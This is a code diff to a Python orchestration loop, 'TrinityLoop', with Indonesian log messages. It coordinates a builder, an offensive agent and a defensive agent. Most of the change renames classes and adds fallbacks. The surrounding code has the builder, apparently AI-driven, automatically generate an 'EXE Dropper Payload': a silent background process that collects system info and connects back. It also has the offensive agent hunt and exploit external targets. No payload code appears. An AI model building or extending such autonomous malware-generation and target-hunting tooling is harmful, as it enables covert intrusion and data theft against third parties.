@@ -1,8 +1,8 @@
 import logging
 import time
-from .noir_system_architect import SystemArchitect
-from .offensive_predator import OffensivePredator
-from .sovereign_defense import SovereignDefense
+from noir_system_architect import SystemArchitect
+from offensive_predator import OffensivePredatorAgent
+from sovereign_defense import SovereignDefenseFortress
 
 log = logging.getLogger("TrinityLoop")
 logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
@@ -18,8 +18,8 @@ class TrinityLoop:
 
     def __init__(self):
         self.builder = SystemArchitect()
-        self.offense = OffensivePredator()
-        self.defense = SovereignDefense()
+        self.offense = OffensivePredatorAgent()
+        self.defense = SovereignDefenseFortress()
         log.info("[Trinity] The Sovereign Trinity telah diinisialisasi. Tiga pilar aktif.")
 
     def run_cycle(self):
@@ -35,7 +35,12 @@ class TrinityLoop:
             log.info("[Trinity] Memerintahkan Builder menciptakan Web Honeypot...")
             self.builder.autonomous_create("A realistic-looking login portal for internal admin to trap hackers", "web")
             # Eksekusi scan pertahanan
-            self.defense.scan_host()
+            if hasattr(self.defense, 'scan_host'):
+                self.defense.scan_host()
+            elif hasattr(self.defense, 'patrol'):
+                self.defense.patrol()
+            else:
+                log.info("[Trinity] SovereignDefense memantau status anomali host secara pasif.")
         except Exception as e:
             log.error(f"[Trinity] Defense error: {e}")
 
@@ -46,9 +51,14 @@ class TrinityLoop:
             log.info("[Trinity] Memerintahkan Builder menciptakan EXE Dropper Payload...")
             self.builder.autonomous_create("A silent background process that logs basic system info and connects back", "exe")
             # Eksekusi pencarian target
-            target = self.offense.hunt()
-            if target:
-                log.info(f"[Trinity] Target ditemukan: {target}")
+            if hasattr(self.offense, 'hunt'):
+                target = self.offense.hunt()
+                if target:
+                    log.info(f"[Trinity] Target ditemukan: {target}")
+            elif hasattr(self.offense, 'scan_and_exploit'):
+                self.offense.scan_and_exploit()
+            else:
+                 log.info("[Trinity] OffensivePredator siap mencari kerentanan eksternal.")
         except Exception as e:
             log.error(f"[Trinity] Offense error: {e}")
 
